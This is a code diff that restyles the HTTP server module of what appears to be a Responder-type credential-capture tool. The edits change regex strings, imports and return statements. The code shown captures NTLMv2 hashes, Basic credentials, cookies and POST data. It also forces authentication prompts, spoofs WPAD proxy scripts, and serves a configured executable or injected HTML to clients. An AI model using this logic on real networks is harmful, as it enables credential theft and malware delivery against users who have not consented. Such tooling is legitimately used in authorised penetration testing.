@@ -14,12 +14,9 @@
 #
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
-import os
-import struct
-import settings
 
-from SocketServer import BaseServer, BaseRequestHandler, StreamRequestHandler, ThreadingMixIn, TCPServer
-from base64 import b64decode, b64encode
+from SocketServer import BaseRequestHandler, StreamRequestHandler
+from base64 import b64decode
 from utils import *
 
 from packets import NTLM_Challenge
@@ -72,58 +69,52 @@ def ParseHTTPHash(data, client):
 			'type': 'NTLMv2', 
 			'client': client, 
 			'host': HostName, 
-			'user': Domain+'\\'+User, 
-			'hash': NTHash[:32]+":"+NTHash[32:], 
+			'user': Domain + '\\' + User,
+			'hash': NTHash[:32] + ":" + NTHash[32:],
 			'fullhash': WriteHash,
 		})
 
 def GrabCookie(data, host):
-	Cookie = re.search('(Cookie:*.\=*)[^\r\n]*', data)
+	Cookie = re.search(r'(Cookie:*.\=*)[^\r\n]*', data)
 
 	if Cookie:
 		Cookie = Cookie.group(0).replace('Cookie: ', '')
 		if len(Cookie) > 1 and settings.Config.Verbose:
 			print text("[HTTP] Cookie           : %s " % Cookie)
 		return Cookie
-	else:
-		return False
+	return False
 
 def GrabHost(data, host):
-	Host = re.search('(Host:*.\=*)[^\r\n]*', data)
+	Host = re.search(r'(Host:*.\=*)[^\r\n]*', data)
 
 	if Host:
 		Host = Host.group(0).replace('Host: ', '')
 		if settings.Config.Verbose:
 			print text("[HTTP] Host             : %s " % color(Host, 3))
 		return Host
-	else:
-		return False
+	return False
 
 def GrabReferer(data, host):
-	Referer = re.search('(Referer:*.\=*)[^\r\n]*', data)
+	Referer = re.search(r'(Referer:*.\=*)[^\r\n]*', data)
 
 	if Referer:
 		Referer = Referer.group(0).replace('Referer: ', '')
 		if settings.Config.Verbose:
 			print text("[HTTP] Referer         : %s " % color(Referer, 3))
 		return Referer
-	else:
-		return False
+	return False
 
 def WpadCustom(data, client):
-	Wpad = re.search('(/wpad.dat|/*\.pac)', data)
+	Wpad = re.search(r'(/wpad.dat|/*\.pac)', data)
 	if Wpad:
 		Buffer = WPADScript(Payload=settings.Config.WPAD_Script)
 		Buffer.calculate()
 		return str(Buffer)
-	else:
-		return False
+	return False
 
 def ServeFile(Filename):
 	with open (Filename, "rb") as bk:
-		data = bk.read()
-		bk.close()
-		return data
+		return bk.read()
 
 def RespondWithFile(client, filename, dlname=None):
 	
@@ -138,9 +129,9 @@ def RespondWithFile(client, filename, dlname=None):
 	return str(Buffer)
 
 def GrabURL(data, host):
-	GET = re.findall('(?<=GET )[^HTTP]*', data)
-	POST = re.findall('(?<=POST )[^HTTP]*', data)
-	POSTDATA = re.findall('(?<=\r\n\r\n)[^*]*', data)
+	GET = re.findall(r'(?<=GET )[^HTTP]*', data)
+	POST = re.findall(r'(?<=POST )[^HTTP]*', data)
+	POSTDATA = re.findall(r'(?<=\r\n\r\n)[^*]*', data)
 
 	if GET and settings.Config.Verbose:
 		print text("[HTTP] GET request from: %-15s  URL: %s" % (host, color(''.join(GET), 5)))
@@ -152,11 +143,11 @@ def GrabURL(data, host):
 
 # Handle HTTP packet sequence.
 def PacketSequence(data, client):
-	NTLM_Auth = re.findall('(?<=Authorization: NTLM )[^\\r]*', data)
-	Basic_Auth = re.findall('(?<=Authorization: Basic )[^\\r]*', data)
+	NTLM_Auth = re.findall(r'(?<=Authorization: NTLM )[^\\r]*', data)
+	Basic_Auth = re.findall(r'(?<=Authorization: Basic )[^\\r]*', data)
 
 	# Serve the .exe if needed
-	if settings.Config.Serve_Always == True or (settings.Config.Serve_Exe == True and re.findall('.exe', data)):
+	if settings.Config.Serve_Always is True or (settings.Config.Serve_Exe is True and re.findall('.exe', data)):
 		return RespondWithFile(client, settings.Config.Exe_Filename, settings.Config.Exe_DlName)
 
 	# Serve the custom HTML if needed
@@ -189,7 +180,6 @@ def PacketSequence(data, client):
 			if settings.Config.Force_WPAD_Auth and WPAD_Custom:
 				print text("[HTTP] WPAD (auth) file sent to %s" % client)
 				return WPAD_Custom
-
 			else:
 				Buffer = IIS_Auth_Granted(Payload=settings.Config.HtmlToInject)
 				Buffer.calculate()
@@ -215,28 +205,23 @@ def PacketSequence(data, client):
 			if settings.Config.Verbose:
 				print text("[HTTP] WPAD (auth) file sent to %s" % client)
 			return WPAD_Custom
-
 		else:
 			Buffer = IIS_Auth_Granted(Payload=settings.Config.HtmlToInject)
 			Buffer.calculate()
 			return str(Buffer)
-
 	else:
 		if settings.Config.Basic:
 			Response = IIS_Basic_401_Ans()
 			if settings.Config.Verbose:
 				print text("[HTTP] Sending BASIC authentication request to %s" % client)
-
 		else:
 			Response = IIS_Auth_401_Ans()
 			if settings.Config.Verbose:
 				print text("[HTTP] Sending NTLM authentication request to %s" % client)
-
 		return str(Response)
 
 # HTTP Server class
 class HTTP(BaseRequestHandler):
-
 	def handle(self):
 		try:
 			while True:
